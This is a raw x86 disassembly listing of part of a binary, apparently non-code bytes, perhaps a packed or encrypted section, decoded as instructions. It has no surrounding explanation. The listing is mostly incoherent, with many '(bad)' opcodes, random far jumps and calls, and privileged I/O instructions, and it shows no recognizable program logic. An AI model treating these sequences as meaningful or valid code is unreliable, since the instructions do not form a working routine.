  41c68a:	rcr    DWORD PTR [esi-0x152de71],1
  41c690:	dec    ebx
  41c691:	push   cs
  41c692:	fnstenv [edx-0x4d]
  41c695:	(bad)  
  41c696:	jnp    0x41c62a
  41c698:	imul   BYTE PTR ds:[edi+eax*8]
  41c69c:	dec    ebp
  41c69d:	cli    
  41c69e:	jnp    0x41c679
  41c6a0:	ret    
  41c6a1:	fistp  DWORD PTR [ecx+0x46]
  41c6a4:	jmp    0x350d:0x2bb670f2
  41c6ab:	jmp    0x762a:0xa4045dd0
  41c6b2:	pop    esi
  41c6b3:	pop    DWORD PTR [esi+0x0]
	...
  41c715:	add    dl,bl
  41c717:	add    edx,eax
  41c719:	xchg   bl,bl
  41c71b:	(bad)  
  41c71c:	ficomp WORD PTR [ebp+0x7e]
  41c71f:	cmp    BYTE PTR [ecx+0x13],dh
  41c722:	xor    BYTE PTR [ebx+0x2c6a6e15],0x1
  41c729:	add    BYTE PTR [edi],al
  41c72b:	add    DWORD PTR [eax],eax
  41c72d:	add    al,dl
  41c72f:	sar    edx,cl
  41c731:	sub    al,0xd2
  41c733:	rep ins DWORD PTR es:[edi],dx
  41c735:	fistp  QWORD PTR [ebx+0x76067433]
  41c73b:	jmp    0x8bd870d0
  41c740:	scas   eax,DWORD PTR es:[edi]
  41c741:	retf   
  41c742:	sub    cl,BYTE PTR [ebp+eax*8+0x12]
  41c746:	dec    edx
  41c747:	sub    al,0x44
  41c749:	push   edi
  41c74a:	not    DWORD PTR [esi-0x3b]
  41c74d:	sahf   
  41c74e:	xchg   BYTE PTR [esi-0x51],bh
  41c751:	imul   ecx,esp,0xaab6e3da
  41c757:	jns    0x41c766
  41c759:	ret    
  41c75a:	mov    esp,0xcaba72a9
  41c75f:	scas   al,BYTE PTR es:[edi]
  41c760:	push   cs
  41c761:	ja     0x41c73c
  41c763:	(bad)  
  41c764:	push   esp
  41c765:	out    dx,eax
  41c766:	sub    al,0xdf
  41c768:	retf   
  41c769:	sub    dh,BYTE PTR [edx]
  41c76b:	call   0xb4302afa
  41c770:	mov    dl,0xca
  41c772:	mov    WORD PTR [ebx+0x428b9bb9],?
  41c778:	inc    ecx
  41c779:	xchg   ebx,eax
  41c77a:	rep lods al,BYTE PTR ds:[esi]
  41c77c:	jo     0x41c7c4
  41c77e:	mov    al,ds:0x153440cf
  41c783:	fwait
  41c784:	in     al,dx
  41c785:	xchg   edx,eax
  41c786:	mov    dh,0x3b
  41c788:	clc    
  41c789:	leave  
  41c78a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c78b:	cmp    eax,0x229f70eb
  41c790:	retf   0x957d
  41c793:	jbe    0x41c80d
  41c795:	dec    ebx
  41c796:	or     dl,BYTE PTR [edi+eiz*8-0x73]
  41c79a:	scas   eax,DWORD PTR es:[edi]
  41c79b:	cwde   
  41c79c:	mov    esp,0xda00795b
  41c7a1:	pop    es
  41c7a2:	nop
  41c7a3:	xchg   DWORD PTR [esi-0x7c098c0a],ebp
  41c7a9:	iret   
  41c7aa:	mov    ds:0x90295d3b,al
  41c7af:	inc    ecx
  41c7b0:	xlat   BYTE PTR ds:[ebx]
  41c7b1:	xchg   DWORD PTR [edi+0x28],esi
  41c7b4:	and    al,0x96
  41c7b6:	jb     0x41c77e
  41c7b8:	pop    ds
  41c7b9:	fadd   st,st(4)
  41c7bb:	sub    ah,cl
  41c7bd:	fidivr DWORD PTR [ebx-0xc7733e7]
  41c7c3:	inc    ebp
  41c7c4:	add    cl,BYTE PTR [ebx+0x162774fb]
  41c7ca:	xchg   esp,eax
  41c7cb:	leave  
  41c7cc:	add    eax,0x7ba50c6b
  41c7d1:	add    ah,BYTE PTR [eax]
  41c7d3:	pop    edi
  41c7d4:	pop    edx
  41c7d5:	adc    eax,0x12970cd3
  41c7da:	xchg   DWORD PTR [edx],edi
  41c7dc:	scas   al,BYTE PTR es:[edi]
  41c7dd:	and    dl,ah
  41c7df:	mov    bl,0xd7
  41c7e1:	or     DWORD PTR [edi-0x55],ebp
  41c7e4:	mov    ebp,0xe07b6a00
  41c7e9:	add    BYTE PTR [ebp+0x439d8f61],bl
  41c7ef:	test   BYTE PTR [ebx],bl
  41c7f1:	jl     0x41c817
  41c7f3:	call   0xd967:0xdc08108b
  41c7fa:	adc    al,0x2c
  41c7fc:	addr16 dec ebp
  41c7fe:	stos   BYTE PTR es:[edi],al
  41c7ff:	loop   0x41c846
  41c801:	in     al,0xee
  41c803:	dec    esp
  41c804:	(bad)  
  41c805:	xlat   BYTE PTR ds:[ebx]
  41c806:	repz int3 
  41c808:	test   eax,0xbb0d4759
  41c80d:	stc    
  41c80e:	sbb    ch,BYTE PTR [ebx-0x632fbea7]
  41c814:	sub    eax,0x1822f6eb
  41c819:	or     dl,BYTE PTR [esi]
  41c81b:	test   DWORD PTR [ecx-0x636b72ab],eax
  41c821:	int    0xac
  41c823:	push   edx
  41c824:	and    dh,dl
  41c826:	leave  
  41c827:	push   ecx
  41c828:	(bad)
  41c82c:	add    BYTE PTR [ebp-0xd],cl
  41c82f:	mov    dl,0x5b
  41c831:	lods   al,BYTE PTR ds:[esi]
  41c832:	push   esi
  41c833:	stos   BYTE PTR es:[edi],al
  41c834:	mov    WORD PTR [eax],es
	...
  41c896:	arpl   WORD PTR [ebp*4-0x44200cc],si
  41c89d:	ja     0x41c8c2
  41c89f:	cs js  0x41c910
  41c8a2:	xchg   esp,eax
  41c8a3:	call   0x2db32beb
  41c8a8:	add    DWORD PTR [eax],eax
  41c8aa:	pop    es
  41c8ab:	add    DWORD PTR [eax],eax
  41c8ad:	add    BYTE PTR [edi+0x4503238f],dh
  41c8b3:	popa   
  41c8b4:	leave  
  41c8b5:	clc    
  41c8b6:	ds push eax
  41c8b8:	adc    eax,0x3162551c
  41c8bd:	(bad)  
  41c8be:	cmp    ebp,edx
  41c8c0:	in     al,dx
  41c8c1:	pop    edx
  41c8c2:	cld    
  41c8c3:	in     al,dx
  41c8c4:	xchg   edi,eax
  41c8c5:	mov    dh,ah
  41c8c7:	dec    edi
  41c8c8:	push   ecx
  41c8c9:	rol    ah,1
  41c8cb:	mov    DWORD PTR [edx],ebx
  41c8cd:	cmc    
  41c8ce:	jmp    0x41c920
  41c8d0:	and    DWORD PTR [esi-0x1f],edx
  41c8d3:	popa   
  41c8d4:	ja     0x41c886
  41c8d6:	aam    0x82
  41c8d8:	int    0xd9
  41c8da:	dec    edi
  41c8db:	mov    al,ds:0x5a169c74
  41c8e0:	dec    ecx
  41c8e1:	mov    edx,0x4fe55db3
  41c8e6:	js     0x41c870
  41c8e8:	add    DWORD PTR [eax-0x7a],ebp
  41c8eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8ec:	ret    0xc812
  41c8ef:	pop    ebx
  41c8f0:	lock xor al,0xec
  41c8f3:	popf   
  41c8f4:	dec    eax
  41c8f5:	div    DWORD PTR [eax]
  41c8f7:	out    dx,al
  41c8f8:	inc    edx
  41c8f9:	sbb    DWORD PTR [ecx+ebp*8+0x6e],esp
  41c8fd:	fimul  WORD PTR [ebx+0x3faf6cc5]
  41c903:	xchg   edx,eax
  41c904:	and    DWORD PTR [edi-0x41b26677],eax
  41c90a:	dec    ebx
  41c90b:	scas   eax,DWORD PTR es:[edi]
  41c90c:	jb     0x41c97a
  41c90e:	sti    
  41c90f:	repnz sub esp,DWORD PTR [esi+eiz*8+0x78950bb]
  41c917:	sub    esp,DWORD PTR [edx+0x5b]
  41c91a:	out    dx,al
  41c91b:	push   ss
  41c91c:	adc    eax,0x95d05446
  41c921:	outs   dx,DWORD PTR ds:[esi]
  41c922:	sub    DWORD PTR [esi+0x5b],0x89dabc2d
  41c929:	add    BYTE PTR [edi-0x68],ch
  41c92c:	or     edx,DWORD PTR ds:0x218b2af
  41c932:	clc    
  41c933:	gs sub al,0x5c
  41c936:	aad    0x6e
  41c938:	jo     0x41c91e
  41c93a:	cmp    eax,DWORD PTR [edi-0x4d]
  41c93d:	out    dx,eax
  41c93e:	clc    
  41c93f:	ja     0x41c8f3
  41c941:	xor    edx,DWORD PTR [ecx+0x6f]
  41c944:	mov    bh,0x6a
  41c946:	enter  0x22ab,0x8
  41c94a:	lahf   
  41c94b:	leave  
  41c94c:	jno    0x41c95f
  41c94e:	fwait
  41c94f:	inc    ebp
  41c950:	(bad)  
  41c951:	jle    0x41c9ab
  41c953:	fisubr WORD PTR [edx-0x2a]
  41c956:	loopne 0x41c901
  41c958:	dec    esp
  41c959:	dec    ebx
  41c95a:	mov    dl,0x6b
  41c95c:	jmp    0xebf4:0x9af707c7
  41c963:	jmp    0x41c959
  41c965:	gs dec ebp
  41c967:	ins    BYTE PTR es:[edi],dx
  41c968:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c969:	rcr    DWORD PTR [ebx+esi*8+0x7e79e5b7],0x7c
  41c971:	mov    ds:0xb3f45699,eax
  41c976:	stos   DWORD PTR es:[edi],eax
  41c977:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c978:	int3   
  41c979:	cmp    BYTE PTR [ecx-0x3a901323],0x6c
  41c980:	pop    ebp
  41c981:	stos   DWORD PTR es:[edi],eax
  41c982:	adc    al,0x70
  41c984:	cmp    BYTE PTR [edi],cl
  41c986:	or     DWORD PTR [eax],0xe6ec0c52
  41c98c:	xchg   ebp,eax
  41c98d:	out    0x42,al
  41c98f:	or     ebx,DWORD PTR [ebx+0x2b]
  41c992:	push   0x365beace
  41c997:	jb     0x41c9ef
  41c999:	repnz in eax,0xed
  41c99c:	sub    al,0x3c
  41c99e:	xor    BYTE PTR [ebx],ah
  41c9a0:	mov    al,ds:0x9d155807
  41c9a5:	jne    0x41c952
  41c9a7:	in     eax,dx
  41c9a8:	lds    esp,FWORD PTR [esi]
  41c9aa:	leave  
  41c9ab:	mov    WORD PTR [esi-0x1874fa2],fs
  41c9b1:	icebp  
  41c9b2:	(bad)  
  41c9b4:	in     al,0x0
	...
  41ca16:	lock retf 0xfc94
  41ca1a:	mov    esi,0x1bcef8fe
  41ca1f:	sub    al,bl
  41ca21:	test   eax,0xc012dc64
  41ca26:	js     0x41ca56
  41ca28:	add    DWORD PTR [eax],eax
  41ca2a:	pop    es
  41ca2b:	add    DWORD PTR [eax],eax
  41ca2d:	add    al,cl
  41ca2f:	in     al,dx
  41ca30:	and    BYTE PTR [edx-0x6ab9607f],dh
  41ca36:	xlat   BYTE PTR ds:[ebx]
  41ca37:	popa   
  41ca38:	xchg   esp,eax
  41ca39:	int3   
  41ca3a:	xchg   ebx,eax
  41ca3b:	dec    edx
  41ca3c:	addr16 inc ebp
  41ca3e:	mov    ch,0x86
  41ca40:	push   0xe0022b5a
  41ca45:	xchg   esp,eax
  41ca46:	mov    ch,0x81
  41ca48:	(bad)  
  41ca49:	cs jne 0x41ca25
  41ca4c:	popf   
  41ca4d:	mov    edx,0x3820fd85
  41ca52:	pop    edi
  41ca53:	jmp    0xcc99:0x89248bf8
  41ca5a:	and    BYTE PTR [edi-0x5b7f64b0],bh
  41ca60:	pop    ebp
  41ca61:	lahf   
  41ca62:	dec    eax
  41ca63:	pop    ebp
  41ca64:	mov    eax,0x6314875e
  41ca69:	call   0xd251:0xf7793bbb
  41ca70:	xchg   ebx,eax
  41ca71:	adc    DWORD PTR [ebx-0x2a9ddd3b],ebp
  41ca77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca78:	adc    eax,0x7efd80d9
  41ca7d:	or     al,BYTE PTR [eax+0x3f99e0ef]
  41ca83:	sub    ecx,DWORD PTR [esi+0x79]
  41ca86:	bound  edi,QWORD PTR gs:[ebp+0x61c9d580]
  41ca8d:	pop    edx
  41ca8e:	pop    ebx
  41ca8f:	popa   
  41ca90:	cdq    
  41ca91:	push   edi
  41ca92:	fistp  DWORD PTR [ebx-0x50]
  41ca95:	mov    cl,0xa3
  41ca97:	jns    0x41caeb
  41ca99:	in     eax,dx
  41ca9a:	(bad)  
  41ca9b:	adc    eax,DWORD PTR [ecx-0x3f]
  41ca9e:	cmp    al,0x54
  41caa0:	rcl    BYTE PTR ds:0xf923c484,0xa2
  41caa7:	popa   
  41caa8:	js     0x41cb1d
  41caaa:	jae    0x41ca61
  41caac:	ins    BYTE PTR es:[edi],dx
  41caad:	icebp  
  41caae:	std    
  41caaf:	gs in  al,dx
  41cab1:	xor    eax,0x9433148a
  41cab6:	or     bh,BYTE PTR ds:0x3492ccce
  41cabc:	jmp    0x4e93:0x5aa1d63e
  41cac3:	push   0x4e
  41cac5:	jae    0x41cae8
  41cac7:	sub    bh,al
  41cac9:	or     eax,0x217d742c
  41cace:	popa   
  41cacf:	jge    0x41cad3
  41cad1:	dec    ebp
  41cad2:	sbb    BYTE PTR [edx],ah
  41cad4:	ins    BYTE PTR es:[edi],dx
  41cad5:	push   ebx
  41cad6:	neg    DWORD PTR [ebx+0x28]
  41cad9:	aaa    
  41cada:	mov    bh,0xeb
  41cadc:	push   0x8
  41cade:	enter  0x3296,0x69
  41cae2:	pusha  
  41cae3:	jne    0x41ca7d
  41cae5:	fdivr  DWORD PTR [ecx+0x46]
  41cae8:	cli    
  41cae9:	(bad)  
  41caea:	(bad)  [ecx+0x1a]
  41caed:	aam    0xb7
  41caef:	xor    edi,esi
  41caf1:	add    al,0x7a
  41caf3:	(bad)  
  41caf5:	add    BYTE PTR [esi+0x6d],bh
  41caf8:	cpuid  
  41cafa:	lods   al,BYTE PTR ds:[esi]
  41cafb:	cld    
  41cafc:	adc    eax,esi
  41cafe:	inc    edi
  41caff:	or     BYTE PTR [ebp-0x75ccdfcc],bl
  41cb05:	adc    edi,DWORD PTR [esi-0x76e05ab2]
  41cb0b:	out    0xbe,al
  41cb0d:	fist   WORD PTR [edx+eax*4]
  41cb10:	adc    DWORD PTR [ecx-0x5],ecx
  41cb13:	sub    al,0xf
  41cb15:	and    ch,BYTE PTR [eax-0x5f58f915]
  41cb1b:	jp     0x41cb94
  41cb1d:	std    
  41cb1e:	ret    0xd246
  41cb21:	push   ss
  41cb22:	and    bh,dh
  41cb24:	repz out dx,al
  41cb26:	fidivr DWORD PTR [eax]
  41cb28:	xchg   DWORD PTR [esp+edi*4+0x54c31a82],edi
  41cb2f:	sbb    ebx,eax
  41cb31:	aam    0x67
  41cb33:	lock mov esi,0x0
	...
  41cb95:	add    BYTE PTR [ecx],ch
  41cb97:	(bad)  
  41cb98:	sti    
  41cb99:	pop    ebp
  41cb9a:	(bad)  
  41cb9b:	jge    0x41cb4c
  41cb9d:	div    BYTE PTR [esi-0x73dc3b4]
  41cba3:	repnz xchg ebp,eax
  41cba5:	(bad)  
  41cba6:	jg     0x41cbd7
  41cba8:	add    DWORD PTR [eax],eax
  41cbaa:	pop    es
  41cbab:	add    DWORD PTR [eax],eax
  41cbad:	add    BYTE PTR [edi],al
  41cbaf:	clc    
  41cbb0:	mov    eax,0x1dacfa13
  41cbb5:	test   DWORD PTR [edi+ebx*4-0x70],0xc7545e24
  41cbbd:	sub    eax,DWORD PTR [esi+0x20]
  41cbc0:	jmp    0x70975a64
  41cbc5:	pop    esp
  41cbc6:	inc    ebx
  41cbc7:	mov    esi,0xb27fab14
  41cbcc:	pusha  
  41cbcd:	retf   
  41cbce:	scas   al,BYTE PTR es:[edi]
  41cbcf:	enter  0x6940,0xcf
  41cbd3:	inc    ebp
  41cbd4:	loopne 0x41cbe4
  41cbd6:	jno    0x41cbcd
  41cbd8:	leave  
  41cbd9:	inc    esp
  41cbda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cbdb:	mov    eax,0x4c11c802
  41cbe0:	push   0x1b994687
  41cbe5:	adc    esi,DWORD PTR [esi]
  41cbe7:	in     al,0xef
  41cbe9:	inc    eax
  41cbea:	cmc    
  41cbeb:	stos   BYTE PTR es:[edi],al
  41cbec:	cmp    esp,DWORD PTR [eax]
  41cbee:	cmp    bl,ch
  41cbf0:	int3   
  41cbf1:	jle    0x41cbea
  41cbf3:	cmp    al,0x96
  41cbf5:	mov    BYTE PTR [ebp+0x67a3af3a],bh
  41cbfb:	mov    al,ds:0xe0f1b32
  41cc00:	pop    esi
  41cc01:	inc    ebx
  41cc02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc03:	and    edi,ecx
  41cc05:	dec    ecx
  41cc06:	fsubr  DWORD PTR fs:[ebp-0x7c]
  41cc0a:	cmp    eax,0x3b726f5e
  41cc0f:	icebp  
  41cc10:	in     eax,dx
  41cc11:	je     0x41cc03
  41cc13:	out    0x7d,eax
  41cc15:	rol    BYTE PTR [eax],1
  41cc17:	xor    dh,0x1f
  41cc1a:	push   ebx
  41cc1b:	mov    bl,BYTE PTR [eax-0x20]
  41cc1e:	lea    esi,[esi-0x6f9ec5ea]
  41cc24:	push   edi
  41cc25:	fsubr  QWORD PTR [edx]
  41cc27:	jbe    0x41cc02
  41cc29:	je     0x41cc52
  41cc2b:	mov    ah,0x40
  41cc2d:	nop
  41cc2e:	lods   al,BYTE PTR ds:[esi]
  41cc2f:	adc    al,0x13
  41cc31:	das    
  41cc32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc33:	bound  edx,QWORD PTR [ebx]
  41cc35:	add    BYTE PTR [ecx+0x43],ch
  41cc38:	push   esi
  41cc39:	fmul   DWORD PTR [eax]
  41cc3b:	inc    eax
  41cc3c:	mov    ebp,0xf463a3d7
  41cc41:	aam    0x2e
  41cc43:	rol    edi,cl
  41cc45:	retf   
  41cc46:	mov    dh,0x40
  41cc48:	cmp    cl,BYTE PTR [esp+esi*4]
  41cc4b:	xchg   ebx,eax
  41cc4c:	dec    eax
  41cc4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc4e:	sti    
  41cc4f:	or     al,0xce
  41cc51:	push   esp
  41cc52:	not    DWORD PTR [ebx+0x4c]
  41cc55:	loop   0x41cc6d
  41cc57:	hlt    
  41cc58:	dec    ebx
  41cc59:	sub    BYTE PTR [esi+0x337c1931],ch
  41cc5f:	mov    dh,0x34
  41cc61:	in     al,0x24
  41cc63:	into   
  41cc64:	stos   BYTE PTR es:[edi],al
  41cc65:	mov    dl,0xfc
  41cc67:	sbb    BYTE PTR [eax-0x451550ef],dl
  41cc6d:	call   0xf50bf6a1
  41cc72:	jb     0x41ccb8
  41cc74:	mov    al,0x7a
  41cc76:	xor    al,0xb8
  41cc78:	mov    ah,0x15
  41cc7a:	xchg   esp,eax
  41cc7b:	or     bl,BYTE PTR [edx+eax*1+0x1d]
  41cc7f:	add    al,0x34
  41cc81:	nop
  41cc82:	les    ecx,FWORD PTR [edi]
  41cc84:	mov    al,0xf3
  41cc86:	xor    al,0x3c
  41cc88:	std    
  41cc89:	mov    ch,0x50
  41cc8b:	xchg   edi,eax
  41cc8c:	adc    al,0x9
  41cc8e:	pop    ecx
  41cc8f:	je     0x41ccca
  41cc91:	aas    
  41cc92:	mov    edi,0x4cfcfa7d
  41cc97:	push   eax
  41cc98:	fnstcw WORD PTR [edx+0xd]
  41cc9b:	push   esi
  41cc9c:	adc    al,0xa2
  41cc9e:	retf   0x9418
  41cca1:	div    BYTE PTR [edx+eax*2+0x75]
  41cca5:	cmp    al,0x88
  41cca7:	imul   ebx,DWORD PTR [ebx],0x76
  41ccaa:	daa    
  41ccab:	ret    
  41ccac:	and    eax,0xdc6e684b
  41ccb1:	push   eax
  41ccb2:	push   ebx
  41ccb3:	addr16 pop esp
	...
  41cd15:	add    BYTE PTR [eax-0x67],ah
  41cd18:	fsubr  st(5),st
  41cd1a:	std    
  41cd1b:	in     eax,0x79
  41cd1d:	popf   
  41cd1e:	dec    ebx
  41cd1f:	int    0x76
  41cd21:	hlt    
  41cd22:	mov    edi,0x8668c0e1
  41cd27:	xor    BYTE PTR [ecx],al
  41cd29:	add    BYTE PTR [edi],al
  41cd2b:	add    DWORD PTR [eax],eax
  41cd2d:	add    BYTE PTR [esi],bh
  41cd2f:	inc    esi
  41cd30:	daa    
  41cd31:	jnp    0x41cd64
  41cd33:	les    ebp,FWORD PTR [edx+ebp*4-0x6d]
  41cd37:	shl    BYTE PTR [esp+ecx*1+0x18],cl
  41cd3b:	js     0x41cd62
  41cd3d:	xchg   BYTE PTR ds:0x5eaf7826,dl
  41cd43:	test   eax,0xdacf3504
  41cd48:	arpl   WORD PTR [edi+0xf],bx
  41cd4b:	push   edi
  41cd4c:	or     eax,0x207f6982
  41cd51:	sbb    al,0xcb
  41cd53:	adc    ch,BYTE PTR [edi+0x76]
  41cd56:	sub    ah,BYTE PTR [edx+edx*8-0x5e59fe2d]
  41cd5d:	fcmovb st,st(6)
  41cd5f:	sub    ebp,esi
  41cd61:	jecxz  0x41cd5e
  41cd63:	lahf   
  41cd64:	xor    bh,cl
  41cd66:	jg     0x41cde0
  41cd68:	or     al,0xff
  41cd6a:	cld    
  41cd6b:	gs inc ebx
  41cd6d:	out    dx,al
  41cd6e:	lods   al,BYTE PTR ds:[esi]
  41cd6f:	and    edx,DWORD PTR [ebp+0x19]
  41cd72:	cmp    eax,0xf6588c2e
  41cd77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd78:	xlat   BYTE PTR ds:[ebx]
  41cd79:	mov    eax,ds:0x5712805
  41cd7e:	mov    ds:0xfc9d9bb6,eax
  41cd83:	fsubr  st(5),st
  41cd85:	fcomp  DWORD PTR [ebp-0x26]
  41cd88:	push   ss
  41cd89:	in     al,dx
  41cd8a:	mov    BYTE PTR [ecx-0x61],cl
  41cd8d:	jae    0x41cd81
  41cd8f:	sub    ebp,DWORD PTR [edx-0x24891ebd]
  41cd95:	add    BYTE PTR [eax+0x1dfcef92],al
  41cd9b:	in     al,0xd
  41cd9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd9e:	aaa    
  41cd9f:	cmp    ebx,ebx
  41cda1:	sbb    eax,0x1e64a689
  41cda6:	inc    ebp
  41cda7:	inc    esi
  41cda8:	mov    bh,0x98
  41cdaa:	xchg   edx,eax
  41cdab:	sbb    al,0x7b
  41cdad:	in     eax,0x59
  41cdaf:	xchg   edi,eax
  41cdb0:	xchg   ecx,eax
  41cdb1:	mov    ebx,0x6096da26
  41cdb6:	fwait
  41cdb7:	aaa    
  41cdb8:	sbb    bl,dl
  41cdba:	das    
  41cdbb:	xor    edx,DWORD PTR [eax]
  41cdbd:	ins    DWORD PTR es:[edi],dx
  41cdbe:	pop    esp
  41cdbf:	and    cl,BYTE PTR [esi-0x5]
  41cdc2:	lea    esp,[edi]
  41cdc4:	ror    edx,0xb4
  41cdc7:	mov    al,ds:0x62675c46
  41cdcc:	pop    ds
  41cdcd:	push   edx
  41cdce:	jne    0x41cdfb
  41cdd0:	or     eax,0xc157563c
  41cdd5:	cld    
  41cdd6:	xlat   BYTE PTR ds:[ebx]
  41cdd7:	neg    DWORD PTR es:[ebp-0x60]
  41cddb:	stos   BYTE PTR es:[edi],al
  41cddc:	or     al,0xd5
  41cdde:	gs nop
  41cde0:	xchg   esi,eax
  41cde1:	push   es
  41cde2:	sbb    BYTE PTR [edx-0x1e],bl
  41cde5:	addr16 xchg esp,eax
  41cde7:	mov    al,0x48
  41cde9:	pushf  
  41cdea:	inc    esp
  41cdeb:	sbb    eax,0x5f4217d6
  41cdf0:	push   ecx
  41cdf1:	fidiv  WORD PTR [ecx]
  41cdf3:	cmp    bl,ch
  41cdf5:	(bad)  
  41cdf6:	(bad)  
  41cdf8:	ret    
  41cdf9:	arpl   bp,sp
  41cdfb:	mov    WORD PTR [ecx-0x31d6b78e],es
  41ce01:	loopne 0x41ce53
  41ce03:	inc    eax
  41ce04:	dec    esp
  41ce05:	repnz add edx,esi
  41ce08:	sbb    eax,0xb228231d
  41ce0d:	pop    ecx
  41ce0e:	jno    0x41ce11
  41ce10:	xchg   esi,eax
  41ce11:	stos   DWORD PTR es:[edi],eax
  41ce12:	inc    edx
  41ce13:	xchg   ebp,eax
  41ce14:	pushf  
  41ce15:	hlt    
  41ce16:	stos   DWORD PTR es:[edi],eax
  41ce17:	pop    edi
  41ce18:	cmp    eax,0x4bc77daa
  41ce1d:	cld    
  41ce1e:	push   esi
  41ce1f:	test   al,0x79
  41ce21:	or     al,0x8d
  41ce23:	or     al,0xd6
  41ce25:	pop    edx
  41ce26:	ficomp WORD PTR [ebp-0x6071fe23]
  41ce2c:	mov    eax,0xba242cb2
  41ce31:	mov    eax,ds:0x594f6f
	...
  41ce96:	pop    es
  41ce97:	jp     0x41ce81
  41ce99:	jnp    0x41ce98
  41ce9b:	sti    
  41ce9c:	xchg   edi,eax
  41ce9d:	jle    0x41ce2e
  41ce9f:	imul   esp,DWORD PTR [edx+0x5b],0x16994782
  41cea6:	lea    esi,[ecx]
  41cea8:	add    DWORD PTR [eax],eax
  41ceaa:	pop    es
  41ceab:	add    DWORD PTR [eax],eax
  41cead:	add    cl,cl
  41ceaf:	dec    edx
  41ceb0:	out    dx,al
  41ceb1:	jns    0x41ce51
  41ceb3:	sar    bh,cl
  41ceb5:	sbb    ecx,ebp
  41ceb7:	push   ds
  41ceb8:	fnstcw WORD PTR [ecx+edi*1-0x15]
  41cebc:	idiv   DWORD PTR [ebx]
  41cebe:	or     BYTE PTR [ebp-0x37],dl
  41cec1:	hlt    
  41cec2:	fisttp WORD PTR [edi+0x21cee2f8]
  41cec8:	addr16 or al,0x9d
  41cecb:	inc    edx
  41cecc:	push   ss
  41cecd:	push   eax
  41cece:	aad    0x8
  41ced0:	or     BYTE PTR [ecx],al
  41ced2:	lock icebp 
  41ced4:	adc    al,0x5b
  41ced6:	in     al,dx
  41ced7:	fist   WORD PTR [edx]
  41ced9:	sub    al,0x21
  41cedb:	ins    BYTE PTR es:[edi],dx
  41cedc:	sahf   
  41cedd:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41cedf:	fcomi  st,st(1)
  41cee1:	jge    0x41cebc
  41cee3:	or     DWORD PTR [eax],0x7dfb9601
  41cee9:	psrld  mm2,mm2
  41ceec:	xchg   edi,eax
  41ceed:	dec    ecx
  41ceee:	loopne 0x41cf6e
  41cef0:	and    BYTE PTR [ebx+0x62c9197d],0x95
  41cef7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cef8:	iret   
  41cef9:	int3   
  41cefa:	jnp    0x41cf4e
  41cefc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cefd:	cmp    al,0x7e
  41ceff:	jecxz  0x41cebd
  41cf01:	inc    ebp
  41cf02:	jmp    0x860b:0xf3cdc61f
  41cf09:	jmp    0x7dcf:0x2ad2c85
  41cf10:	xor    ah,BYTE PTR [esi-0x7c]
  41cf13:	pusha  
  41cf14:	data16 js 0x41cf93
  41cf17:	shr    BYTE PTR [ecx-0xaa280],0x64
  41cf1e:	jge    0x41cf3c
  41cf20:	adc    edx,DWORD PTR [esi-0x28]
  41cf23:	test   al,0x92
  41cf25:	xor    DWORD PTR [ebp-0x68b62197],edx
  41cf2b:	addr16 mov ah,al
  41cf2e:	repnz mov BYTE PTR [edx+0x37],al
  41cf32:	pop    edi
  41cf33:	cmc    
  41cf34:	jmp    0xaa2edcbb
  41cf39:	dec    ecx
  41cf3a:	lods   eax,DWORD PTR ds:[esi]
  41cf3b:	(bad)  
  41cf3c:	cmp    ecx,DWORD PTR [ebx+0x51cc5891]
  41cf42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf43:	ins    BYTE PTR es:[edi],dx
  41cf44:	sub    DWORD PTR [eax+0x5f38e56f],esi
  41cf4a:	add    eax,0xc419e640
  41cf4f:	es iret 
  41cf51:	dec    esi
  41cf52:	sar    BYTE PTR [eax-0x38a609ca],1
  41cf58:	retf   
  41cf59:	push   ss
  41cf5a:	mov    al,0xaa
  41cf5c:	jae    0x41cfb3
  41cf5e:	pop    edi
  41cf5f:	jmp    FWORD PTR [edi]
  41cf61:	imul   ebp,DWORD PTR [edi+ecx*1+0x2844ec0b],0x6514ddaa
  41cf6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf6d:	pop    esp
  41cf6e:	shl    DWORD PTR [ecx+0xa5bf44a],0x84
  41cf75:	inc    esp
  41cf76:	stos   DWORD PTR es:[edi],eax
  41cf77:	and    dh,BYTE PTR [ebx-0x58]
  41cf7a:	(bad)  
  41cf7b:	mov    ds:0x523ec875,eax
  41cf80:	cmp    ah,dh
  41cf82:	add    DWORD PTR [edi+eiz*2-0x70e43466],edx
  41cf89:	in     eax,dx
  41cf8a:	dec    esi
  41cf8b:	push   eax
  41cf8c:	(bad)  
  41cf8d:	or     DWORD PTR ds:0x3f1da943,edi
  41cf93:	mov    ds:0xc1b0203c,al
  41cf98:	jno    0x41cf31
  41cf9a:	mov    gs,ebx
  41cf9c:	jl     0x41cfe6
  41cf9e:	aas    
  41cf9f:	dec    esp
  41cfa0:	jbe    0x41cfeb
  41cfa2:	jno    0x41cff7
  41cfa4:	sub    ecx,DWORD PTR [edi-0x7da09308]
  41cfaa:	ins    DWORD PTR es:[edi],dx
  41cfab:	jge    0x41cffc
  41cfad:	xor    bh,BYTE PTR [esi]
  41cfaf:	and    eax,0x2cb2203e
  41cfb4:	jmp    0x0:0x0
	...
  41d013:	add    BYTE PTR [eax],al
  41d015:	add    BYTE PTR [ecx-0x52bcdfcc],bh
  41d01b:	push   edi
  41d01c:	sti    
  41d01d:	(bad)  
  41d01e:	das    
  41d01f:	ret    
  41d020:	lods   al,BYTE PTR ds:[esi]
  41d021:	daa    
  41d022:	jmp    0x945104dd
  41d027:	xor    al,BYTE PTR [ecx]
  41d029:	add    BYTE PTR [edi],al
  41d02b:	add    DWORD PTR [eax],eax
  41d02d:	add    BYTE PTR [edx-0x25afd5dc],bh
